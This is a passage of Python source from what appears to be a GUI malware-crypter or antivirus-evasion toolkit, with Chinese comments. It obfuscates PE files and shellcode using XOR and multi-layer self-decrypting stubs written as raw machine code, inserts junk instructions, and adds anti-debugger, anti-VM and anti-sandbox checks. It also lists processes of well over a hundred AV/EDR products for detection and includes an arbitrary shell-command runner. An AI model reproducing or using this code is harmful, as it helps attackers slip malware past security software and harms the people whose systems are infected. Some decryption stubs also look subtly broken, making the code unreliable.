            QMessageBox.critical(self, "错误", f"进程注入失败: {message}")

    def perform_obfuscation(self):
        """执行代码混淆"""
        input_file = self.obfuscate_input_file.text()
        output_file = self.obfuscate_output_file.text()
        
        # 验证输入
        if not input_file or not os.path.exists(input_file):
            QMessageBox.warning(self, "错误", "请选择有效的输入文件")
            return
            
        if not output_file:
            QMessageBox.warning(self, "错误", "请指定输出文件路径")
            return
        
        # 获取混淆选项
        file_type = self.file_type_combo.currentText()
        obfuscation_method = self.obfuscation_method_combo.currentText()
        obfuscation_strength = self.obfuscation_strength_combo.currentText()
        
        # 高级选项
        use_string_encryption = self.string_encryption_checkbox.isChecked()
        use_api_obfuscation = self.api_obfuscation_checkbox.isChecked()
        use_control_flow = self.control_flow_checkbox.isChecked()
        use_antidebug = self.antidebug_obfuscation_checkbox.isChecked()
        
        # 执行混淆
        self.update_status(f"正在对 {input_file} 执行混淆...")
        QApplication.processEvents()
        
        try:
            # 根据文件类型选择不同的混淆策略
            if "EXE" in file_type or "DLL" in file_type:
                # PE文件混淆
                pe = pefile.PE(input_file)
                
                # 1. 修改PE头部信息
                if use_api_obfuscation:
                    randomize_headers(pe)
                    
                # 2. 修改时间戳
                manipulate_timestamp(pe)
                
                # 3. 随机化节名称
                modify_section_names(pe, True)
                
                # 4. 添加虚假证书数据
                add_fake_certificate(pe)
                
                # 5. 保存修改后的PE文件
                pe.write(output_file)
                
                # 6. 如果是高强度混淆，添加额外的保护层
                if obfuscation_strength in ["高", "极高"]:
                    # 添加自解密存根
                    with open(output_file, 'rb') as f:
                        pe_data = f.read()
                    
                    # 加密PE文件主体
                    key = generate_random_key(16)
                    encrypted_data = custom_xor(pe_data, key)
                    
                    # 创建自解密存根
                    stub = generate_polymorphic_stub(len(pe_data), "custom_xor", key, 
                                                   use_antidebug, 3, True)
                    
                    # 写入最终文件
                    with open(output_file, 'wb') as f:
                        f.write(stub + encrypted_data)
                
                self.update_status("PE文件混淆完成!")
                
            elif "Shellcode" in file_type:
                # Shellcode混淆
                with open(input_file, 'rb') as f:
                    shellcode = f.read()
                
                # 1. 选择加密方法
                if "多态变形" in obfuscation_method:
                    # 多层加密
                    key1 = generate_random_key(8)
                    key2 = generate_random_key(16)
                    
                    # 第一层加密 (XOR)
                    encrypted_data = bytes(b ^ key1[i % len(key1)] for i, b in enumerate(shellcode))
                    
                    # 第二层加密 (自定义XOR)
                    encrypted_data = custom_xor(encrypted_data, key2)
                    
                    # 创建多层解密存根
                    stub1 = generate_polymorphic_stub(len(encrypted_data), "custom_xor", key2, 
                                                    use_antidebug, 3, True)
                    
                    # 第一层解密存根
                    stub2 = bytearray()
                    stub2.extend(b'\xE8\x00\x00\x00\x00')  # call next instruction
                    stub2.extend(b'\x5E')                  # pop esi
                    stub2.extend(b'\xB9' + struct.pack("<I", len(shellcode)))  # mov ecx, len
                    
                    # 添加XOR循环
                    for i in range(len(key1)):
                        stub2.extend(b'\x80\x36' + bytes([key1[i]]))  # xor byte ptr [esi], key[i]
                        stub2.extend(b'\x46')                         # inc esi
                        if i < len(key1) - 1:
                            stub2.extend(b'\xE2\xF9')                 # loop to xor instruction
                    
                    # 最终shellcode
                    final_shellcode = stub1 + encrypted_data + bytes(stub2)
                    
                else:
                    # 简单加密
                    key = generate_random_key(16)
                    encrypted_data = custom_xor(shellcode, key)
                    stub = generate_polymorphic_stub(len(shellcode), "custom_xor", key, 
                                                   use_antidebug, 2, False)
                    final_shellcode = stub + encrypted_data
                
                # 写入输出文件
                with open(output_file, 'wb') as f:
                    f.write(final_shellcode)
                    
                self.update_status("Shellcode混淆完成!")
                
            else:
                # 其他类型文件
                QMessageBox.warning(self, "错误", f"不支持的文件类型: {file_type}")
                return
            
            QMessageBox.information(self, "成功", f"混淆处理成功!\n输出文件: {output_file}")
            
        except Exception as e:
            import traceback
            traceback.print_exc()
            self.update_status("混淆处理失败!")
            QMessageBox.critical(self, "错误", f"混淆处理失败: {str(e)}")

    def run_tool(self, tool_name):
        """运行选定的工具"""
        self.update_status(f"正在准备运行工具: {tool_name}")
        
        # 这里可以实现各种工具的实际功能
        # 为了示例，只显示消息框
        QMessageBox.information(self, "工具", f"工具 '{tool_name}' 功能尚未实现")
        
        self.update_status(f"工具 {tool_name} 执行完成")

    def run_custom_tool(self):
        """运行自定义工具或命令"""
        command = self.custom_tool_input.text()
        
        if not command:
            QMessageBox.warning(self, "错误", "请输入有效的命令或工具路径")
            return
        
        self.update_status(f"正在执行: {command}")
        
        try:
            import subprocess
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                self.update_status(f"命令执行成功")
                QMessageBox.information(self, "成功", f"命令执行成功\n输出:\n{result.stdout}")
            else:
                self.update_status(f"命令执行失败")
                QMessageBox.warning(self, "警告", f"命令执行失败\n错误:\n{result.stderr}")
                
        except Exception as e:
            self.update_status(f"命令执行出错")
            QMessageBox.critical(self, "错误", f"命令执行出错: {str(e)}")

    def update_status(self, message):
        """更新状态栏消息"""
        self.status_message = message
        self.status_label.setText(message)
        QApplication.processEvents()

    def refresh_av_list(self):
        """刷新杀毒软件列表"""
        self.av_result_text.clear()
        self.update_status("正在检测系统中的杀毒软件...")
        
        av_processes = detect_av_processes()
        
        if not av_processes:
            self.av_result_text.append("未检测到已知的杀毒软件进程")
            return
            
        self.av_result_text.append("检测到的杀毒软件进程:\n")
        for av_name, processes in av_processes.items():
            self.av_result_text.append(f"\n[*] {av_name}:")
            for pid, status in processes:
                self.av_result_text.append(f"    - PID: {pid} (状态: {status})")
        
        self.update_status("杀毒软件检测完成")

# 添加更多高级免杀技术
def add_junk_code(shellcode, ratio=0.2):
    """向shellcode中添加垃圾指令，提高免杀效果"""
    junk_instructions = [
        b'\x90',              # NOP
        b'\x50\x58',          # PUSH EAX; POP EAX
        b'\x51\x59',          # PUSH ECX; POP ECX
        b'\x52\x5A',          # PUSH EDX; POP EDX
        b'\x53\x5B',          # PUSH EBX; POP EBX
        b'\x87\xDB',          # XCHG EBX, EBX
        b'\x87\xC9',          # XCHG ECX, ECX
        b'\x33\xC0\x40\x48',  # XOR EAX, EAX; INC EAX; DEC EAX
        b'\xEB\x00',          # JMP +0 (next instruction)
    ]
    
    result = bytearray()
    for i, byte in enumerate(shellcode):
        result.append(byte)
        
        # 随机插入垃圾指令
        if random.random() < ratio:
            junk = random.choice(junk_instructions)
            result.extend(junk)
    
    return bytes(result)

def add_anti_analysis(shellcode):
    """添加反分析技术到shellcode"""
    anti_analysis_code = bytearray()
    
    # 1. 检测调试器 (IsDebuggerPresent)
    anti_analysis_code.extend([
        0x64, 0xA1, 0x30, 0x00, 0x00, 0x00,  # MOV EAX, FS:[0x30]
        0x0F, 0xB6, 0x40, 0x02,              # MOVZX EAX, BYTE PTR [EAX+2]
        0x84, 0xC0,                          # TEST AL, AL
        0x74, 0x05,                          # JZ not_debugged
        0xE9, 0xFF, 0xFF, 0xFF, 0xFF,        # JMP crash (will be patched)
        # not_debugged:
    ])
    
    # 2. 检测虚拟机 (CPUID)
    anti_analysis_code.extend([
        0x31, 0xC9,                          # XOR ECX, ECX
        0x0F, 0xA2,                          # CPUID
        0x81, 0xFB, 0x68, 0x74, 0x65, 0x56,  # CMP EBX, "VBox"
        0x75, 0x03,                          # JNZ not_vbox
        0xE9, 0xFF, 0xFF, 0xFF, 0xFF,        # JMP crash (will be patched)
        # not_vbox:
    ])
    
    # 3. 时间延迟检测 (反沙箱)
    anti_analysis_code.extend([
        0x0F, 0x31,                          # RDTSC
        0x89, 0xC3,                          # MOV EBX, EAX
        0xB9, 0xFF, 0xFF, 0x00, 0x00,        # MOV ECX, 0xFFFF
        # delay_loop:
        0x49,                                # DEC ECX
        0x75, 0xFD,                          # JNZ delay_loop
        0x0F, 0x31,                          # RDTSC
        0x29, 0xD8,                          # SUB EAX, EBX
        0x3D, 0x00, 0x40, 0x00, 0x00,        # CMP EAX, 0x4000
        0x73, 0x05,                          # JAE not_sandbox
        0xE9, 0xFF, 0xFF, 0xFF, 0xFF,        # JMP crash (will be patched)
        # not_sandbox:
    ])
    
    # 组合反分析代码和原始shellcode
    return bytes(anti_analysis_code) + shellcode

def multi_layer_encryption(shellcode, layers=3):
    """多层加密shellcode"""
    encrypted = shellcode
    keys = []
    
    # 多层加密
    for i in range(layers):
        key = generate_random_key(8 + i * 4)  # 逐层增加密钥长度
        keys.append(key)
        
        if i % 3 == 0:
            # XOR加密
            encrypted = bytes(b ^ key[i % len(key)] for i, b in enumerate(encrypted))
        elif i % 3 == 1:
            # 自定义XOR加密
            encrypted = custom_xor(encrypted, key)
        else:
            # RC4加密
            encrypted = rc4_encrypt(encrypted, key)
    
    # 生成多层解密存根
    stub = bytearray()
    
    # 添加反调试代码
    stub.extend([
        0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00,  # MOV RAX, GS:[0x60]
        0x48, 0x8B, 0x40, 0x18,                               # MOV RAX, [RAX+18h]
        0x84, 0xC0,                                           # TEST AL, AL
        0x74, 0x04,                                           # JZ no_debugger
        0xEB, 0xFE                                            # JMP $ (infinite loop)
    ])
    
    # 获取当前位置
    stub.extend(b'\xE8\x00\x00\x00\x00')  # CALL $+5
    stub.extend(b'\x5B')                  # POP RBX
    
    # 逆序解密每一层
    for i in range(layers - 1, -1, -1):
        key = keys[i]
        
        if i % 3 == 0:
            # XOR解密
            stub.extend(b'\x48\x31\xC9')                  # XOR RCX, RCX
            stub.extend(b'\x48\xB9' + struct.pack("<Q", len(shellcode)))  # MOV RCX, len
            
            xor_loop = len(stub)
            stub.extend(b'\x8A\x03')                      # MOV AL, [RBX]
            
            for j in range(len(key)):
                stub.extend(b'\x34' + bytes([key[j % len(key)]]))  # XOR AL, key[j]
            
            stub.extend(b'\x88\x03')                      # MOV [RBX], AL
            stub.extend(b'\x48\xFF\xC3')                  # INC RBX
            stub.extend(b'\xE2' + struct.pack("b", xor_loop - len(stub) - 1))  # LOOP xor_loop
            
        elif i % 3 == 1:
            # 自定义XOR解密
            stub.extend(b'\x48\x31\xC9')                  # XOR RCX, RCX
            stub.extend(b'\x48\xB9' + struct.pack("<Q", len(shellcode)))  # MOV RCX, len
            
            xor_loop = len(stub)
            stub.extend(b'\x8A\x03')                      # MOV AL, [RBX]
            
            for j in range(len(key)):
                shift = (j % 7) + 1
                shifted_key = ((key[j] << shift) | (key[j] >> (8 - shift))) & 0xFF
                stub.extend(b'\x34' + bytes([shifted_key]))  # XOR AL, shifted_key
            
            stub.extend(b'\x88\x03')                      # MOV [RBX], AL
            stub.extend(b'\x48\xFF\xC3')                  # INC RBX
            stub.extend(b'\xE2' + struct.pack("b", xor_loop - len(stub) - 1))  # LOOP xor_loop
            
        else:
            # RC4解密 
            stub.extend(b'\x48\x31\xC9')                  # XOR RCX, RCX
            stub.extend(b'\x48\xB9' + struct.pack("<Q", len(shellcode)))  # MOV RCX, len
            
            xor_loop = len(stub)
            stub.extend(b'\x8A\x03')                      # MOV AL, [RBX]
            
            # 完整RC4
            for j in range(len(key)):
                stub.extend(b'\x34' + bytes([key[j % len(key)]]))  # XOR AL, key[j]
            
            stub.extend(b'\x88\x03')                      # MOV [RBX], AL
            stub.extend(b'\x48\xFF\xC3')                  # INC RBX
            stub.extend(b'\xE2' + struct.pack("b", xor_loop - len(stub) - 1))  # LOOP xor_loop
    
    # 跳转到解密后的shellcode
    stub.extend(b'\xFF\xE3')  # JMP RBX
    
    return bytes(stub) + encrypted

def detect_av_processes():
    """
    检测系统中运行的杀毒软件进程
    返回: 字典 {av_name: [pid, status]}
    """
    av_signatures = {
    'ALYac': ['aylaunch.exe', 'ayupdate2.exe', 'AYRTSrv.exe', 'AYAgent.exe'],
    'AVG': ['AVGSvc.exe', 'AVGUI.exe', 'avgwdsvc.exe', 'avg.exe', 'avgaurd.exe', 'avgemc.exe', 'avgrsx.exe', 'avgserv.exe', 'avgw.exe'],
    'Acronis': ['arsm.exe', 'acronis_license_service.exe'],
    'Ad-Aware': ['AdAwareService.exe', 'Ad-Aware.exe', 'AdAware.exe'],
    'AhnLab-V3': ['patray.exe', 'V3Svc.exe'],
    'Arcabit': ['arcavir.exe', 'arcadc.exe', 'ArcaVirMaster.exe', 'ArcaMainSV.exe', 'ArcaTasksService.exe'],
    'Avast': ['ashDisp.exe', 'AvastUI.exe', 'AvastSvc.exe', 'AvastBrowser.exe', 'AfwServ.exe'],
    'Avira AntiVirus(小红伞)': ['avcenter.exe', 'avguard.exe', 'avgnt.exe', 'sched.exe'],
    'Baidu AntiVirus': ['BaiduSdSvc.exe', 'BaiduSdTray.exe', 'BaiduSd.exe', 'bddownloader.exe', 'baiduansvx.exe'],
    'BitDefender': ['Bdagent.exe', 'BitDefenderCom.exe', 'vsserv.exe', 'bdredline.exe', 'secenter.exe', 'bdservicehost.exe', 'BITDEFENDER.exe'],
    'Bkav': ['BKavService.exe', 'Bka.exe', 'BkavUtil.exe', 'BLuPro.exe'],
    'CAT-QuickHeal': ['QUHLPSVC.exe', 'onlinent.exe', 'sapissvc.exe', 'scanwscs.exe'],
    'CMC': ['CMCTrayIcon.exe'],
    'ClamAV': ['freshclam.exe'],
    'Comodo': ['cpf.exe', 'cavwp.exe', 'ccavsrv.exe', 'cmdvirth.exe'],
    'CrowdStrike Falcon(猎鹰)': ['csfalconservice.exe', 'CSFalconContainer.exe'],
    'Cybereason': ['CybereasonRansomFree.exe', 'CybereasonRansomFreeServiceHost.exe', 'CybereasonAV.exe'],
    'Cylance': ['CylanceSvc.exe'],
    'Cyren': ['vsedsps.exe', 'vseamps.exe', 'vseqrts.exe'],
    'DrWeb': ['drwebcom.exe', 'spidernt.exe', 'drwebscd.exe', 'drweb32w.exe', 'dwengine.exes'],
    'ESET-NOD32': ['egui.exe', 'ecls.exe', 'ekrn.exe', 'eguiProxy.exe', 'EShaSrv.exe'],
    'Trend Micro（趋势科技）': ['tmpfw.exe', 'tmlisten.exe', 'coreServiceShell.exe', 'coreFrameworkHost.exe', 'uiWatchDog.exe', 'TMLISTEN.exe'],
    'Emsisoft': ['a2guard.exe', 'a2free.exe', 'a2service.exe'],
    'Endgame': ['endgame.exe'],
    'F-Prot': ['F-PROT.exe', 'FProtTray.exe', 'FPAVServer.exe', 'f-stopw.exe', 'f-prot95.exe', 'f-agnt95.exe'],
    'F-Secure': ['f-secure.exe', 'fssm32.exe', 'Fsorsp64.exe', 'fsavgui.exe', 'fameh32.exe', 'fch32.exe', 'fih32.exe', 'fnrb32.exe', 'fsav32.exe', 'fsma32.exe', 'fsmb32.exe'],
    'FireEye(火眼)': ['xagtnotif.exe', 'xagt.exe'],
    'Fortinet（飞塔）': ['FortiClient.exe', 'FortiTray.exe', 'FortiScand.exe', 'FortiWF.exe', 'FortiProxy.exe', 'FortiESNAC.exe', 'FortiSSLVPNdaemon.exe', 'FortiTcs.exe', 'FctSecSvr.exe'],
    'GData': ['AVK.exe', 'avkcl.exe', 'avkpop.exe', 'avkservice.exe', 'GDScan.exe', 'AVKWCtl.exe', 'AVKProxy.exe', 'AVKBackupService.exe'],
    'Ikarus': ['guardxservice.exe', 'guardxkickoff.exe'],
    'Jiangmin': ['KVFW.exe', 'KVsrvXP.exe', 'KVMonXP.exe', 'KVwsc.exe'],
    'K7AntiVirus': ['K7TSecurity.exe', 'K7TSMain.Exe', 'K7TSUpdT.exe'],
    'Kaspersky(卡巴斯基)': ['avp.exe', 'avpcc.exe', 'avpm.exe', 'kavpf.exe', 'kavfs.exe', 'klnagent.exe', 'kavtray.exe', 'kavfswp.exe', 'kaspersky.exe'],
    'Max Secure Software': ['SDSystemTray.exe', 'MaxRCSystemTray.exe', 'RCSystemTray.exe', 'MaxAVPlusDM.exe', 'LiveUpdateSD.exe'],
    'Malwarebytes': ['MBAMService.exe', 'mbam.exe', 'mbamtray.exe'],
    'McAfee(迈克菲)': ['Mcshield.exe', 'Tbmon.exe', 'Frameworkservice.exe', 'firesvc.exe', 'firetray.exe', 'hipsvc.exe', 'mfevtps.exe', 'mcafeefire.exe', 'shstat.exe', 'vstskmgr.exe', 'engineserver.exe', 'alogserv.exe', 'avconsol.exe', 'cmgrdian.exe', 'cpd.exe', 'mcmnhdlr.exe', 'mcvsshld.exe', 'mcvsrte.exe', 'mghtml.exe', 'mpfservice.exe', 'mpfagent.exe', 'mpftray.exe', 'vshwin32.exe', 'vsstat.exe', 'guarddog.exe', 'mfeann.exe', 'udaterui.exe', 'naprdmgr.exe', 'mctray.exe', 'fcagate.exe', 'fcag.exe', 'fcags.exe', 'fcagswd.exe', 'macompatsvc.exe', 'masvc.exe', 'mcamnsvc.exe', 'mctary.exe', 'mfecanary.exe', 'mfeconsole.exe', 'mfeesp.exe', 'mfefire.exe', 'mfefw.exe', 'mfemms.exe', 'mfetp.exe', 'mfewc.exe', 'mfewch.exe'],
    'Microsoft Security Essentials': ['MsMpEng.exe', 'msseces.exe', 'mssecess.exe', 'emet_agent.exe', 'emet_service.exe', 'drwatson.exe', 'MpCmdRun.exe', 'NisSrv.exe', 'MsSense.exe', 'MSASCui.exe', 'MSASCuiL.exe', 'SecurityHealthService.exe'],
    'NANO-Antivirus': ['nanoav.exe', 'nanoav64.exe', 'nanoreport.exe', 'nanoreportc.exe', 'nanoreportc64.exe', 'nanorst.exe', 'nanosvc.exe'],
    'Palo Alto Networks': ['PanInstaller.exe'],
    'Panda Security': ['remupd.exe', 'apvxdwin.exe', 'pavproxy.exe', 'pavsched.exe'],
    'Qihoo-360': ['360sd.exe', '360tray.exe', 'ZhuDongFangYu.exe', '360rp.exe', '360rps.exe', '360safe.exe', '360safebox.exe', 'QHActiveDefense.exe', '360skylarsvc.exe', 'LiveUpdate360.exe'],
    'Rising': ['RavMonD.exe', 'rfwmain.exe', 'RsMgrSvc.exe', 'RavMon.exe'],
    'SUPERAntiSpyware': ['superantispyware.exe', 'sascore.exe', 'SAdBlock.exe', 'sabsvc.exe'],
    'SecureAge APEX': ['UniversalAVService.exe', 'EverythingServer.exe', 'clamd.exe'],
    'Sophos AV': ['SavProgress.exe', 'icmon.exe', 'SavMain.exe', 'SophosUI.exe', 'SophosFS.exe', 'SophosHealth.exe', 'SophosSafestore64.exe', 'SophosCleanM.exe', 'SophosFileScanner.exe', 'SophosNtpService.exe', 'SophosOsquery.exe', 'Sophos UI.exe'],
    'TACHYON': [],
    'Tencent': ['QQPCRTP.exe', 'QQPCTray.exe', 'QQPCMgr.exe', 'QQPCNetFlow.exe', 'QQPCRealTimeSpeedup.exe'],
    'TotalDefense': ['AMRT.exe', 'SWatcherSrv.exe', 'Prd.ManagementConsole.exe'],
    'Trapmine': ['TrapmineEnterpriseService.exe', 'TrapmineEnterpriseConfig.exe', 'TrapmineDeployer.exe', 'TrapmineUpgradeService.exe'],
    'TrendMicro': ['TMBMSRV.exe', 'ntrtscan.exe', 'Pop3Trap.exe', 'WebTrap.exe', 'PccNTMon.exe'],
    'VIPRE': ['SBAMSvc.exe', 'VipreEdgeProtection.exe', 'SBAMTray.exe'],
    'ViRobot': ['vrmonnt.exe', 'vrmonsvc.exe', 'Vrproxyd.exe'],
    'Webroot': ['npwebroot.exe', 'WRSA.exe', 'spysweeperui.exe'],
    'Yandex': ['Yandex.exe', 'YandexDisk.exe', 'yandesk.exe'],
    'Zillya': ['zillya.exe', 'ZAVAux.exe', 'ZAVCore.exe'],
    'ZoneAlarm': ['vsmon.exe', 'zapro.exe', 'zonealarm.exe'],
    'Zoner': ['ZPSTray.exe'],
    'eGambit': ['dasc.exe', 'memscan64.exe', 'dastray.exe'],
    'eScan': ['consctl.exe', 'mwaser.exe', 'avpmapp.exe'],
    'Lavasoft': ['AAWTray.exe', 'LavasoftTcpService.exe', 'AdAwareTray.exe', 'WebCompanion.exe', 'WebCompanionInstaller.exe', 'adawarebp.exe', 'ad-watch.exe'],
    'The Cleaner': ['cleaner8.exe'],
    'VBA32': ['vba32lder.exe'],
    'Mongoosa': ['MongoosaGUI.exe', 'mongoose.exe'],
    'Coranti2012': ['CorantiControlCenter32.exe'],
    'UnThreat': ['UnThreat.exe', 'utsvc.exe'],
    'Shield Antivirus': ['CKSoftShiedAntivirus4.exe', 'shieldtray.exe'],
    'VIRUSfighter': ['AVWatchService.exe', 'vfproTray.exe'],
    'Immunet': ['iptray.exe'],
    'PSafe': ['PSafeSysTray.exe', 'PSafeCategoryFinder.exe', 'psafesvc.exe'],
    'nProtect': ['nspupsvc.exe', 'Npkcmsvc.exe', 'npnj5Agent.exe'],
    'Spyware Terminator': ['SpywareTerminatorShield.exe', 'SpywareTerminator.exe'],
    'Norton（赛门铁克）': ['ccSvcHst.exe', 'rtvscan.exe', 'ccapp.exe', 'NPFMntor.exe', 'ccRegVfy.exe', 'vptray.exe', 'iamapp.exe', 'nav.exe', 'navapw32.exe', 'navapsvc.exe', 'nisum.exe', 'nmain.exe', 'nprotect.exe', 'smcGui.exe', 'ns.exe', 'nortonsecurity.exe'],
    'Symantec（赛门铁克）': ['ccSetMgr.exe', 'ccapp.exe', 'vptray.exe', 'ccpxysvc.exe', 'cfgwiz.exe', 'smc.exe', 'symproxysvc.exe', 'vpc32.exe', 'lsetup.exe', 'luall.exe', 'lucomserver.exe', 'sbserv.exe', 'ccEvtMgr.exe', 'smcGui.exe', 'snac.exe', 'SymCorpUI.exe', 'sepWscSvc64.exe'],
    '可牛杀毒': ['knsdtray.exe'],
    '流量矿石': ['Miner.exe'],
    'SafeDog(安全狗)': ['safedog.exe', 'SafeDogGuardCenter.exe', 'SafeDogSiteIIS.exe', 'SafeDogTray.exe', 'SafeDogServerUI.exe', 'SafeDogSiteApache.exe', 'CloudHelper.exe', 'SafeDogUpdateCenter.exe'],
    '木马克星': ['parmor.exe', 'Iparmor.exe'],
    '贝壳云安全': ['beikesan.exe'],
    '木马猎手': ['TrojanHunter.exe'],
    '巨盾网游安全盾': ['GG.exe'],
    '绿鹰安全精灵': ['adam.exe'],
    '超级巡警': ['AST.exe'],
    '墨者安全专家': ['ananwidget.exe'],
    '风云防火墙': ['FYFireWall.exe'],
    '微点主动防御': ['MPMon.exe'],
    '天网防火墙': ['pfw.exe'],
    'D 盾': ['D_Safe_Manage.exe', 'd_manage.exe'],
    '云锁': ['yunsuo_agent_service.exe', 'yunsuo_agent_daemon.exe'],
    '护卫神': ['HwsPanel.exe', 'hws_ui.exe', 'hws.exe', 'hwsd.exe', 'HwsHostPanel.exe', 'HwsHostMaster.exe'],
    '火绒安全': ['hipstray.exe', 'wsctrl.exe', 'usysdiag.exe', 'HipsDaemon.exe', 'HipsLog.exe', 'HipsMain.exe', 'wsctrlsvc.exe'],
    '网络病毒克星': ['WEBSCANX.exe'],
    'SPHINX防火墙': ['SPHINX.exe'],
    '奇安信天擎': ['TQClient.exe', 'TQTray.exe', 'QaxEngManager.exe', 'TQDefender.exe'],
    'H+BEDV Datentechnik GmbH': ['avwin.exe', 'avwupsrv.exe'],
    'IBM ISS Proventia': ['blackd.exe', 'rapapp.exe'],
    'eEye Digital Security': ['eeyeevnt.exe', 'blink.exe'],
    'Kerio Personal Firewall': ['persfw.exe', 'wrctrl.exe'],
    'Simplysup': ['Trjscan.exe'],
    'PC Tools AntiVirus': ['PCTAV.exe', 'pctsGui.exe'],
    'VirusBuster Professional': ['vbcmserv.exe'],
    'ClamWin': ['ClamTray.exe', 'clamscan.exe'],
    '安天智甲': ['kxetray.exe', 'kscan.exe', 'AMediumManager.exe', 'kismain.exe'],
    'CMC Endpoint Security': ['CMCNECore.exe', 'cmcepagent.exe', 'cmccore.exe', 'CMCLog.exe', 'CMCFMon.exe'],
    '金山毒霸': ['kxetray.exe', 'kxescore.exe', 'kupdata.exe', 'kwsprotect64.exe', 'kislive.exe', 'knewvip.exe', 'kscan.exe', 'kxecenter.exe', 'kxemain.exe', 'KWatch.exe', 'KSafeSvc.exe', 'KSafeTray.exe'],
    'Agnitum outpost (Outpost Firewall)': ['outpost.exe', 'acs.exe'],
    'Cynet': ['CynetLauncher.exe', 'CynetDS.exe', 'CynetEPS.exe', 'CynetMS.exe', 'CynetAR.exe', 'CynetGW.exe', 'CynetSD64.exe'],
    'Elastic': ['winlogbeat.exe'],
    '金山网盾': ['KSWebShield.exe'],
    'G Data安全软件客户端': ['AVK.exe'],
    '金山网镖': ['kpfwtray.exe'],
    '在扫1433': ['1433.exe'],
    '在爆破': ['DUB.exe'],
    '发现S-U': ['ServUDaemon.exe'],
    '百度卫士': ['bddownloader.exe', 'baiduSafeTray.exe'],
    '百度卫士-主进程': ['baiduansvx.exe'],
    'G Data文件系统实时监控': ['avkwctl9.exe', 'AVKWCTL.exe'],
    'Sophos Anti-Virus': ['SAVMAIN.exe'],
    '360保险箱': ['safeboxTray.exe', '360safebox.exe'],
    'G Data扫描器': ['GDScan.exe'],
    'G Data杀毒代理': ['AVKProxy.exe'],
    'G Data备份服务': ['AVKBackupService.exe'],
    '亚信安全服务器深度安全防护系统': ['Notifier.exe'],
    '阿里云盾': ['AliYunDun.exe', 'AliYunDunUpdate.exe', 'aliyun_assist_service.exe', '/usr/local/aegis/aegis_client/'],
    '腾讯云安全': ['BaradAgent.exe', 'sgagent.exe', 'YDService.exe', 'YDLive.exe', 'YDEdr.exe'],
    '360主机卫士Web': ['360WebSafe.exe', 'QHSrv.exe', 'QHWebshellGuard.exe'],
    '网防G01': ['gov_defence_service.exe', 'gov_defence_daemon.exe'],
    '云锁客户端': ['PC.exe'],
    'Symantec Shared诺顿邮件防火墙软件': ['SNDSrvc.exe'],
    'U盘杀毒专家': ['USBKiller.exe'],
    '天擎EDRAgent': ['360EntClient.exe'],
    '360(奇安信)天擎': ['360EntMisc.exe'],
    '阿里云-云盾': ['alisecguard.exe'],
    'Sophos AutoUpdate Service': ['ALsvc.exe'],
    '阿里云监控': ['CmsGoAgent.windows-amd64.'],
    '深信服EDRAgent': ['edr_agent.exe', 'edr_monitor.exe', 'edr_sec_plan.exe'],
    '启明星辰天珣EDRAgent': ['ESAV.exe', 'ESCCControl.exe', 'ESCC.exe', 'ESCCIndex.exe'],
    '蓝鲸Agent': ['gse_win_agent.exe', 'gse_win_daemon.exe'],
    '联想电脑管家': ['LAVService.exe'],
    'Sophos MCS Agent': ['McsAgent.exe'],
    'Sophos MCS Client': ['McsClient.exe'],
    '360TotalSecurity(360国际版)': ['QHSafeMain.exe', 'QHSafeTray.exe', 'QHWatchdog.exe', 'QHActiveDefense.exe'],
    'Sophos Device Control Service': ['sdcservice.exe'],
    'Sophos Endpoint Defense Service': ['SEDService.exe'],
    'Windows Defender SmartScreen': ['smartscreen.exe'],
    'Sophos Clean Service': ['SophosCleanM64.exe'],
    'Sophos FIM': ['SophosFIMService.exe'],
    'Sophos System Protection Service': ['SSPService.exe'],
    'Sophos Web Control Service': ['swc_service.exe'],
    '天眼云镜': ['TitanAgent.exe', 'TitanMonitor.exe'],
    '天融信终端防御': ['TopsecMain.exe', 'TopsecTray.exe'],
    '360杀毒-网盾': ['wdswfsafe.exe'],
    '智量安全': ['WiseVector.exe', 'WiseVectorSvc.exe'],
    '天擎': ['QAXEntClient.exe', 'QAXTray.exe'],
    '安恒主机卫士': ['AgentService.exe', 'ProtectMain.exe'],
    '亚信DS服务端': ['Deep Security Manager.exe'],
    '亚信DS客户端': ['dsa.exe', 'UniAccessAgent.exe', 'dsvp.exe'],
    '深信服EDR': ['/sangfor/edr/agent'],
    '阿里云云助手守护进程': ['/assist-daemon/assist_daemon'],
    'zabbix agen端': ['zabbix_agentd'],
    '阿里云盾升级': ['/usr/local/aegis/aegis_update/AliYunDunUpdate'],
    '阿里云助手': ['/usr/local/share/aliyun-assist'],
    '阿里系监控': ['AliHips', 'AliNet', 'AliDetect', 'AliScriptEngine'],
    '腾讯系监控': ['secu-tcs-agent', '/usr/local/qcloud/stargate/', '/usr/local/qcloud/monitor/', '/usr/local/qcloud/YunJing/'],
    '腾讯自动化助手TAT产品': ['/usr/local/qcloud/tat_agent/'],
    'SentinelOne(哨兵一号)': ['SentinelServiceHost.exe', 'SentinelStaticEngine.exe', 'SentinelStaticEngineScanner.exe', 'SentinelMemoryScanner.exe', 'SentinelAgent.exe', 'SentinelAgentWorker.exe', 'SentinelUI.exe'],
    'OneSec(微步)': ['tbAgent.exe', 'tbAgentSrv.exe', 'tbGuard.exe'],
    '亚信安全防毒墙网络版': ['PccNT.exe', 'PccNTMon.exe', 'PccNTUpd.exe'],
    'Illumio ZTS': ['venVtapServer.exe', 'venPlatformHandler.exe', 'venAgentMonitor.exe', 'venAgentMgr.exe'],
    '奇安信统一服务器安全': ['NuboshEndpoint.exe'],
    'IObit Malware Fighter': ['IMF.exe', 'IMFCore.exe', 'IMFsrv.exe', 'IMFSrvWsc.exe'],
    'Deep Instinct': ['DeepUI.exe']
}
    
    found_avs = {}
    
    try:
        for proc in psutil.process_iter(['pid', 'name', 'status']):
            proc_name = proc.info['name'].lower()
            
            for av_name, signatures in av_signatures.items():
                if any(sig.lower() in proc_name for sig in signatures):
                    pid = proc.info['pid']
                    status = proc.info['status']
                    # 如果已经找到这个AV，检查是否需要更新状态
                    if av_name in found_avs:
                        found_avs[av_name].append([pid, status])
                    else:
                        found_avs[av_name] = [[pid, status]]
                        
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        pass
        
    return found_avs

def refresh_av_list(self):
    """刷新杀毒软件列表"""
    self.av_result_text.clear()
    self.update_status("正在检测系统中的杀毒软件...")
    
    av_processes = detect_av_processes()
    
    if not av_processes:
        self.av_result_text.append("未检测到已知的杀毒软件进程")
        return
        
    self.av_result_text.append("检测到的杀毒软件进程:\n")
    for av_name, processes in av_processes.items():
        self.av_result_text.append(f"\n[*] {av_name}:")
        for pid, status in processes:
